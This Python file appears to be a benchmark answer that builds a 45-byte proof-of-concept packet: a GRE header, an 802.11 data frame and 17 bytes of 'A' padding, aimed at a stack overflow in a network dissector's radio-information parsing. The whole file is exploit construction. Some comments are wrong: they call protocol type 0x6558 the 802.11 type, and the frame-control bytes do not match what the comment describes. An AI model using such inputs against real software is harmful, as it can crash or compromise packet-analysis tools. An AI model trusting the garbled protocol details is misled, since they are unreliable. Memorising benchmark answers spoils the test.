import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth indicates 45 bytes trigger the vulnerability
        # We need to create a GRE packet that will be passed to 802.11 dissector
        
        # GRE header structure (RFC 2784):
        # 0-1: Flags and version (C,R,K,S,s,Recur,Flags,Ver)
        # 2-3: Protocol Type (0x6558 for 802.11)
        # 4-7: Optional fields depending on flags
        
        # For this vulnerability, we need to provide a GRE header followed by
        # 802.11 data that will cause buffer overflow when parsed
        
        # Create minimal GRE header (4 bytes)
        # Flags: 0x00 (no checksum, no routing, etc.)
        # Version: 0x00 (GRE)
        # Protocol Type: 0x6558 (Transparent Ethernet Bridging - used for 802.11)
        gre_header = struct.pack('>HH', 0x0000, 0x6558)
        
        # Now create 802.11 frame that will trigger stack overflow
        # The vulnerability is in radio information parsing
        # We need to create malformed 802.11 data that overflows buffer
        
        # Start with minimal 802.11 frame
        # Frame Control Field (2 bytes): Type=Data(0x08), Subtype=0x00, ToDS=1, FromDS=0
        frame_control = 0x0801  # Data frame, ToDS=1
        
        # Duration (2 bytes)
        duration = 0x0000
        
        # Destination MAC (6 bytes)
        dest_mac = b'\xff\xff\xff\xff\xff\xff'  # Broadcast
        
        # Source MAC (6 bytes)
        src_mac = b'\x00\x00\x00\x00\x00\x01'
        
        # BSSID (6 bytes)
        bssid = b'\x00\x00\x00\x00\x00\x02'
        
        # Sequence Control (2 bytes)
        seq_ctrl = 0x0000
        
        # Construct 802.11 header
        dot11_header = (struct.pack('<HH', frame_control, duration) +
                       dest_mac + src_mac + bssid +
                       struct.pack('<H', seq_ctrl))
        
        # The vulnerability is in how radio information is parsed
        # We need to create payload that will overflow when processed
        # The ground truth is 45 bytes total
        
        # GRE header: 4 bytes
        # 802.11 header: 24 bytes (2+2+6+6+6+2)
        # That leaves 17 bytes for payload to reach 45 total
        
        # Create overflow payload
        # We'll create a pattern that will likely trigger overflow
        # when dissector tries to copy radio information
        overflow_payload = b'A' * 17  # Simple pattern to trigger overflow
        
        # Combine everything
        poc = gre_header + dot11_header + overflow_payload
        
        # Verify length is exactly 45 bytes
        if len(poc) != 45:
            # Adjust if needed
            poc = poc[:45] if len(poc) > 45 else poc.ljust(45, b'\x00')
        
        return poc
